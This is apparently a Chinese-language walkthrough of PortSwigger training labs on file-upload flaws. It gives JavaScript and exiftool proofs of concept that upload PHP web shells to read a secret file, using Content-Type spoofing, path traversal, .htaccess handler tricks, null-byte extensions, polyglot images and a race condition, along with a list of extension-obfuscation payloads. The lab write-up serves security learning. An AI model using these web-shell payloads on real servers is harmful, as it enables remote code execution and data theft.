---
title: File upload vulnerabilities
description: File upload vulnerabilities
last_update:
  date: "2025-10-23T08:00:00+08:00"
---

## Lab: Remote code execution via web shell upload

| Dimension | Description                                                                                                 |
| --------- | ----------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#exploiting-unrestricted-file-uploads-to-deploy-a-web-shell |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload |

沒想到這題是 APPRENTICE，我想應該就是上傳檔案，沒有實作副檔名跟內容限制吧，雖然是最簡單的技巧，但是影響力卻很高，CVSS 評分應該可以到滿分的漏洞

PoC

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "2odrwN7cqkhKRQRvotaiv1n1lwdYWDzw");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "shell.php",
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  credentials: "include",
});
```

## Lab: Web shell upload via Content-Type restriction bypass

| Dimension | Description                                                                                                           |
| --------- | --------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#flawed-file-type-validation                                          |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass |

這題也是基本題，在真實世界用到爛掉的 Bypass 手法

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "m6UOOFWOQLPqPMrLYYBVcs8dkcAraT1t");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "shell.php",
    { type: "image/png" },
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  credentials: "include",
});
```

## Lab: Web shell upload via path traversal

| Dimension | Description                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#preventing-file-execution-in-user-accessible-directories |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal      |

這招也是我在真實世界用過的手法

PoC

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "isZVVSYEYtpRlaCX6yz0anh5DAVx57Nb");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "..%2fshell.php",
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  credentials: "include",
});
```

server 回傳

```
The file avatars/../shell.php has been uploaded.
```

之後訪問 `/files/avatars/..%2fshell.php` => `/files/shell.php` 即可達成 RCE

## Lab: Web shell upload via extension blacklist bypass

| Dimension | Description                                                                                                      |
| --------- | ---------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#insufficient-blacklisting-of-dangerous-file-types               |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass |

先上傳 `.htaccess`

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "IGiRSDTUXszpBJ3J9UsP9jz22kivemQu");
fd.append(
  "avatar",
  new File([`AddType application/x-httpd-php .hello`], ".htaccess"),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  credentials: "include",
});
```

再上傳 `shell.hello`

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "IGiRSDTUXszpBJ3J9UsP9jz22kivemQu");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "shell.hello",
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  credentials: "include",
});
```

這招確實猛，我以前沒想過可以上傳 `.htaccess`

## Obfuscating file extensions

- exploit.pHp
- exploit.php.jpg
- exploit.php.
- exploit%2Ephp
- exploit.php;.jpg
- exploit.php%00.jpg
- multibyte unicode characters <!-- todo-yus -->
- exploit.p.phphp

## Lab: Web shell upload via obfuscated file extension

| Dimension | Description                                                                                                     |
| --------- | --------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#insufficient-blacklisting-of-dangerous-file-types              |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension |

就用上面提供的 Bypass 技巧逐一嘗試，最終在

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "M0stqThtJxov3aBvJWunvgIOEUVgegPI");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "exploit.php%00.jpg",
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  credentials: "include",
});
```

成功解題，PHP 底層是 C，字串的結尾是 null byte

## Lab: Remote code execution via polyglot web shell upload

| Dimension | Description                                                                                                          |
| --------- | -------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#flawed-validation-of-the-file-s-contents                            |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload |

這題使用 portSwigger 建議的工具 exiftool，並且在桌面準備好一個真實的 image.jpg

```
brew install exiftool
cd desktop
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
```

產出 polyglot.php 之後，透過 Web UI 上傳，然後訪問 `/files/avatars/polyglot.php`，應該會看到一坨亂碼，瀏覽器 Ctrl + F 搜尋 `START`，應該會看到

```
START Kwa3KwFDkKrf8MoaUZ0aVjpgJJlxX0KX END
```

中間那串就是答案

## How does PHP Parser handle output

創建一個 shell.php

```php
jfoiweriojlkjfksldvncv,mdslkfj
<?php echo "<br/>hello-world<br/>" ?>
sdklfjweoiruiwejnkvdnvkjsdklgs
```

本機啟動 php dev server

```
php -S localhost:8000
```

瀏覽器訪問 http://localhost:8000/shell.php

```
jfoiweriojlkjfksldvncv,mdslkfj
hello-world
sdklfjweoiruiwejnkvdnvkjsdklgs
```

可以得出一個很重要的結論，PHP Parser 會去搜尋 `<?php  ?>` 內部的程式碼執行，其餘部分就會原文輸出，所以在上面的題目，才需要使用

```php
'START ' . file_get_contents('/home/carlos/secret') . ' END'
```

這樣才可以在一坨 jpg 內容中，精準地搜尋到 php 執行程式碼的結果

我一開始以為只會輸出 `<?php  ?>` 程式碼執行的內容，沒想到其餘部分竟然是原文輸出，若原文是 jpg 就會有很多雜訊

## Lab: Web shell upload via race condition

| Dimension | Description                                                                                          |
| --------- | ---------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/file-upload#exploiting-file-upload-race-conditions              |
| Lab       | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition |

Hint 有給 php code，所以變成白箱測試了

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
```

想像上應該是

```php
// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

// 此時 php webshell 已經可以透過 HTTP Request 來訪問，需要在 server 刪除前趕快訪問
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}
```

這題瞬間變得很簡單

```js
const fd = new FormData();
fd.append("user", "wiener");
fd.append("csrf", "EOlCVJy5giNrjz6qnDjGJXHlQW150IES");
fd.append(
  "avatar",
  new File(
    ['<?php echo file_get_contents("/home/carlos/secret");?>'],
    "exploit.php",
  ),
);
fetch(`${location.origin}/my-account/avatar`, {
  body: fd,
  method: "POST",
  credentials: "include",
});
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
```

Enter 以後，可以再繼續執行

```js
fetch(`${location.origin}/files/avatars/exploit.php`)
  .then((res) => res.text())
  .then(console.log);
```

增加成功率，嘗試兩次即成功執行～

## 小結

這系列的 Labs 也是很快就結束了，但確實也有學到新的攻擊向量

## 參考資料

- https://portswigger.net/web-security/file-upload
